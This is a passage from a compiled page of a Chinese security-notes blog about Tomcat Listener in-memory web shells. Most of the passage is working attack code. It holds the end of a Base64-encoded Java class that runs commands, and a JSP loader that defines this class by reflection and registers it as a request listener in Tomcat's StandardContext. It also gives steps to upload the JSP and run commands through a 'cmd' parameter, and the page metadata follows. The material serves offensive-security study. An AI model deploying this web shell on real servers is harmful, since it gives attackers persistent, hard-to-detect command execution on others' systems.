dXQBAAFzAQAHaXNMaW51eAEAAVoBABBwcm9jZXNzQnVpbGRlck9TAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAlwcm9jZXNzT1MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAEaW5PUwEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BAC1Mb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdEZhY2FkZTsBAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA3JlcQEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAdodHRwUmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEdmFyNQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEADVN0YWNrTWFwVGFibGUHAMoBABNqYXZhL2lvL0lucHV0U3RyZWFtBwC5AQAScmVxdWVzdEluaXRpYWxpemVkAQAKU291cmNlRmlsZQEAFlN1bW1lckNNRExpc3RlbmVyLmphdmEAIQCdAAIAAQCfAAAAAwABAAUABgABAKEAAAAzAAEAAQAAAAUqtwABsQAAAAIAogAAAAoAAgAAABEABAASAKMAAAAMAAEAAAAFAKQApQAAAAEApgCnAAEAoQAABKkABgATAAABpSu2AAfAAA1NLLYADxITtgAVTi0EtgAbLSy2ACHAACU6BBkEtgAnOgUZBRIruQAtAgAZBRIzuQA1AgAZBbkAOAEAEjy2AD4ZBDoGGQYSQ7kARQIAOgcZB8YBRQQ2CLsAS1kEvQBNWQMST1O3AFE6CRkJtgBUOgoZCrYAWDoLuwBeWRkLtwBgEmO2AGU6DBkMtgBpmQALGQy2AG2nAAUScToNGQ0Sc7YAdZkABgM2CBkMxgAmGQy2AHmnAB46DRkMxgAUGQy2AHmnAAw6DhkNGQ62AH4ZDb8VCJkAGQa9AE1ZAxKCU1kEEoRTWQUZB1OnABYGvQBNWQMShlNZBBKIU1kFGQdTOgy4AIoZDLYAkLYAWDoNuwBeWRkNtwBgEmO2AGU6DhkOtgBpmQALGQ62AG2nAAUScToPGQW5ADgBADoQGRAZD7YAPhkQtgCUGRDGACYZELYAl6cAHjoRGRDGABQZELYAl6cADDoSGREZErYAfhkRvxkOxgAmGQ62AHmnAB46DxkOxgAUGQ62AHmnAAw6EBkPGRC2AH4ZD7+nAAhNLLYAmrEABwCNAK4AuwB8AMIAxwDKAHwBQAFMAVkAfAFgAWUBaAB8ASMBdAGBAHwBiAGNAZAAfAAAAZwBnwCYAAMAogAAAJYAJQAAABYACAAXABIAGAAXABkAIQAaACgAGwAxABwAOgAdAEYAHwBKACAAVQAhAFoAIgBdACMAbwAkAHYAJQB9ACYAjQAnAKEAKQCrACoArgAsALsAJgDWAC0A8QAuAQYALwETADABIwAxATcAMgFAADMBRwA0AUwANQFZADIBdAA2AYEAMAGcADoBnwA4AaAAOQGkADwAowAAAMoAFAChAA0AqACpAA0AjQBJAKoAqwAMAUAANACsAK0AEAE3AD0ArgCpAA8BIwB5AK8AqwAOAF0BPwCwALEACABvAS0AsgCzAAkAdgEmALQAtQAKAH0BHwC2ALcACwEGAJYAuAC5AAwBEwCJALoAtwANAAgBlAAUALsAAgASAYoAvAC9AAMAIQF7AL4AvwAEACgBdADAAMEABQBKAVIAwgDDAAYAVQFHAEQAqQAHAaAABADEAMUAAgAAAaUApAClAAAAAAGlAMYAxwABAMgAAAFOABX/AJ0ADQcAnQcACAcADQcAHAcAJQcALgcARgcATQEHAEsHAFkHAMkHAF4AAEEHAE0OTAcAfP8ADgAOBwCdBwAIBwANBwAcBwAlBwAuBwBGBwBNAQcASwcAWQcAyQcAXgcAfAABBwB8CPkAAhpSBwDL/gAuBwDLBwDJBwBeQQcATf8AIwARBwCdBwAIBwANBwAcBwAlBwAuBwBGBwBNAQcASwcAWQcAyQcAywcAyQcAXgcATQcAPwABBwB8/wAOABIHAJ0HAAgHAA0HABwHACUHAC4HAEYHAE0BBwBLBwBZBwDJBwDLBwDJBwBeBwBNBwA/BwB8AAEHAHwI+AACTAcAfP8ADgAQBwCdBwAIBwANBwAcBwAlBwAuBwBGBwBNAQcASwcAWQcAyQcAywcAyQcAXgcAfAABBwB8CP8AAgACBwCdBwAIAABCBwCYBAABAMwApwABAKEAAAA1AAAAAgAAAAGxAAAAAgCiAAAABgABAAAAPwCjAAAAFgACAAAAAQCkAKUAAAAAAAEAxgDHAAEAAQDNAAAAAgDO&quot;;</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>    // 获取当前线程的上下文类加载器 ClassLoader</span></span>
<span class="line"><span>    ClassLoader loader = Thread.currentThread().getContextClassLoader();</span></span>
<span class="line"><span>    // 使用 Base64 解码一个Java类class文件的二进制数据的Base64编码的字符串成字节数组</span></span>
<span class="line"><span>    Base64.Decoder base64Decoder = Base64.getDecoder();</span></span>
<span class="line"><span>    byte[] decodeBytes = base64Decoder.decode(SUMMER_CMD_LISTENER_CLASS_STRING_BASE64);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    Method method = null;</span></span>
<span class="line"><span>    Class&lt;?&gt; clz = loader.getClass();</span></span>
<span class="line"><span>    Class&lt;?&gt; listenerClass = null;</span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    // 在一个 while 循环中不断尝试获取该方法，如果当前类 clz 中没有找到 defineClass 方法，则继续向其父类查找，直到找到该方法或到达</span></span>
<span class="line"><span>    // Object 类为止</span></span>
<span class="line"><span>    while (method == null &amp;&amp; clz != Object.class) {</span></span>
<span class="line"><span>        try {</span></span>
<span class="line"><span>            method = clz.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);</span></span>
<span class="line"><span>        } catch (NoSuchMethodException ex) {</span></span>
<span class="line"><span>            clz = clz.getSuperclass();</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>    if (method != null) {</span></span>
<span class="line"><span>        // 一旦找到了 defineClass 方法，代码将其设置为可访问的（即使该方法是私有的）</span></span>
<span class="line"><span>        method.setAccessible(true);</span></span>
<span class="line"><span>        // 通过反射调用该方法，将解码后的字节数组 decodeBytes 转换为一个 Class 对象并返回</span></span>
<span class="line"><span>        listenerClass = (Class&lt;?&gt;) method.invoke(loader, decodeBytes, 0, decodeBytes.length);</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    // 获取StandardContext</span></span>
<span class="line"><span>    StandardContext standardCtx = null;</span></span>
<span class="line"><span>    ServletContext servletContext = request.getServletContext();</span></span>
<span class="line"><span>    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    appContextField.setAccessible(true);</span></span>
<span class="line"><span>    Object appContext = appContextField.get(servletContext);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    Field standardCtxField = appContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    standardCtxField.setAccessible(true);</span></span>
<span class="line"><span>    standardCtx = (StandardContext) standardCtxField.get(appContext);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    if (standardCtx != null) {</span></span>
<span class="line"><span>        // 添加监听器</span></span>
<span class="line"><span>        standardCtx.addApplicationEventListener((ServletRequestListener) listenerClass.getDeclaredConstructor().newInstance());</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>        out.println(&quot;Successfully added a new listener By Base64 Class String to StandardContext&quot;);</span></span>
<span class="line"><span>    } else {</span></span>
<span class="line"><span>        out.println(&quot;Failed to get StandardContext&quot;);</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上传到 tomcat webapps 目录下, 比如上传到 ROOT 目录里:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410101135319.png" alt="image-20241010113512205"></p><p>直接测试命令执行: <code>/dynamicAddListenerBase64Class.jsp?cmd=whoami</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410101136899.png" alt="image-20241010113622848"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410101137391.png" alt="image-20241010113715324"></p><hr>`,109)]))}const c=e(t,[["render",l],["__file","index.html.vue"]]),d=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Listener%E5%86%85%E5%AD%98%E9%A9%AC/","title":"Tomcat Listener 内存马","lang":"zh-CN","frontmatter":{"category":["网络安全","Web安全","Java"],"tags":["内存马","Tomcat","Listener","Listener内存马"],"description":"Tomcat Listener 内存马 JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org) Tomcat Listener 内存马 Listener内存马基本知识 Listener内存马示例 示例效果 整体思路 示例构造 环境准备 制作Listener 编译 Listener 然后将 class 文件转换为 Base64 字符串 编...","head":[["meta",{"property":"og:url","content":"https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/Listener%E5%86%85%E5%AD%98%E9%A9%AC/"}],["meta",{"property":"og:site_name","content":"DailyNotes"}],["meta",{"property":"og:title","content":"Tomcat Listener 内存马"}],["meta",{"property":"og:description","content":"Tomcat Listener 内存马 JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org) Tomcat Listener 内存马 Listener内存马基本知识 Listener内存马示例 示例效果 整体思路 示例构造 环境准备 制作Listener 编译 Listener 然后将 class 文件转换为 Base64 字符串 编..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"http://cdn.ayusummer233.top/DailyNotes/202409301705658.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-04-16T10:17:38.000Z"}],["meta",{"property":"article:tag","content":"内存马"}],["meta",{"property":"article:tag","content":"Tomcat"}],["meta",{"property":"article:tag","content":"Listener"}],["meta",{"property":"article:tag","content":"Listener内存马"}],["meta",{"property":"article:modified_time","content":"2025-04-16T10:17:38.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Tomcat Listener 内存马\\",\\"image\\":[\\"http://cdn.ayusummer233.top/DailyNotes/202409301705658.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410071915963.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410081826508.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410081826652.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091412648.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091730152.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091731434.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091731153.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091540059.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091543132.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091555851.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091608367.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091609777.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091611618.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091612756.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091614023.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091614776.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091630516.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091636399.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091639794.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091639185.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091645349.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091646773.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091730152.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091731434.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410091731153.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410101135319.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410101136899.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410101137391.png\\"],\\"dateModified\\":\\"2025-04-16T10:17:38.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"咸鱼型233\\",\\"url\\":\\"https://233official.github.io/dailynotes/\\"}]}"]],"date":"2024-10-07T14:23:21.000Z"},"headers":[{"level":2,"title":"Listener内存马基本知识","slug":"listener内存马基本知识","link":"#listener内存马基本知识","children":[]},{"level":2,"title":"Listener内存马示例","slug":"listener内存马示例","link":"#listener内存马示例","children":[{"level":3,"title":"示例效果","slug":"示例效果","link":"#示例效果","children":[]},{"level":3,"title":"整体思路","slug":"整体思路","link":"#整体思路","children":[]},{"level":3,"title":"示例构造","slug":"示例构造","link":"#示例构造","children":[]}]},{"level":2,"title":"其他用法思路","slug":"其他用法思路","link":"#其他用法思路","children":[]},{"level":2,"title":"JSP马","slug":"jsp马","link":"#jsp马","children":[]}],"git":{"createdTime":1728311001000,"updatedTime":1744798658000,"contributors":[{"name":"233Mac","username":"233Mac","email":"ayusummer233@vip.qq.com","commits":3,"url":"https://github.com/233Mac"},{"name":"233","username":"233","email":"ayusummer233@vip.qq.com","commits":2,"url":"https://github.com/233"},{"name":"233PC","username":"233PC","email":"ayusummer233@gmail.com","commits":1,"url":"https://github.com/233PC"}]},"readingTime":{"minutes":7.45,"words":2234},"filePathRelative":"网络安全/Web安全/漏洞类型/内存马/Java内存马/Tomcat内存马/Listener内存马/index.md","localizedDate":"2024年10月7日","excerpt":"","autoDesc":true}');export{c as comp,d as data};
